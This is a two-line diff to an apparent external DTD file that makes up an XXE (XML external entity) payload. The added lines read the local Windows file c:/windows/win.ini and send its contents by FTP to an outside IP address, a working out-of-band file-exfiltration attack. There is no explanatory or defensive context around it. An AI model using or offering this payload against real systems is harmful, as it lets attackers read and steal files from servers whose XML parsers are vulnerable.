@@ -1,1 +1,2 @@
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://159.65.28.225:21/%d;'>"> 
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://159.65.28.225:21/%data;'>"> 
